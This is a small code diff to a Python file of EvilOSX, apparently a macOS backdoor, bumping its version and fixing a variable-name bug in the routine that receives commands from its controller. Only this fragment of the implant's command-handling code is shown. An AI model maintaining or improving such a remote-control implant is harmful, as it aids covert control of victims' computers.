@@ -4,7 +4,7 @@
 # Random Hash: This text will be replaced when building EvilOSX.
 __author__ = "Marten4n6"
 __license__ = "GPLv3"
-__version__ = "3.2.2"
+__version__ = "3.2.3"
 
 import time
 import urllib2
@@ -95,7 +95,7 @@ def receive_command():
 
         if not response_line:
             return None
-        elif response == "You dun goofed.":
+        elif response_line == "You dun goofed.":
             return Command(None, "first_connection")
         else:
             json_response = json.loads(response_line)
